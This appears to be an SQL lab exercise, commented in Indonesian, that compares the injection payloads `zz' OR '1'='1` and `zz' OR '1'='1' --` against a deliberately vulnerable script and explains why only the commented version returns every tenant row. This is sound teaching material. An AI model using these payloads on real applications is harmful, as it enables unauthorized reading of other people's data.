-- Diminta: membandingkan hasil payload `zz' OR '1'='1` dan `zz' OR '1'='1' --`
--          serta menjelaskan penyebab perbedaan jumlah barisnya.
-- Dipilih: menguji kedua payload pada konstruksi string SQL yang sama untuk
--          membuktikan percampuran saluran kode dan saluran data.
-- Alternatif: menyaring tanda kutip tunggal; tidak dipilih karena akar
--             masalahnya adalah penggabungan string masukan ke sintaks SQL.

-- Jalankan di kontainer lab11-web:
-- 1) python rentan.py rentan "zz' OR '1'='1"
--    SQL terbentuk : SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1%'
--    Jumlah baris  : 0
--
-- 2) python rentan.py rentan "zz' OR '1'='1' --"
--    SQL terbentuk : SELECT id, nama, kota FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1' --%'
--    Jumlah baris  : 10000 (seluruh baris penyewa 1)
--
-- Penjelasan:
-- Pada payload pertama (tanpa `--`), tanda kutip tunggal dan `%` penutup milik
-- kode aplikasi menempel di ujung payload sehingga kondisinya menjadi `'1'='1%'`.
-- Karena `'1'` tidak sama dengan `'1%'` (FALSE) dan tidak ada nama mengandung `'zz'`,
-- hasilnya 0 baris. Pada payload kedua, `--` mengomentari sisa `%'` bawaan kode,
-- menyisakan `OR '1'='1'` (selalu TRUE) sehingga seluruh baris penyewa dikembalikan.

BEGIN;
SET LOCAL ROLE app_portal;
SET LOCAL app.tenant = '1';
SELECT count(*) AS tanpa_komentar FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1%';
SELECT count(*) AS dengan_komentar FROM lab11.pelanggan WHERE nama ILIKE '%zz' OR '1'='1' --%';
COMMIT;
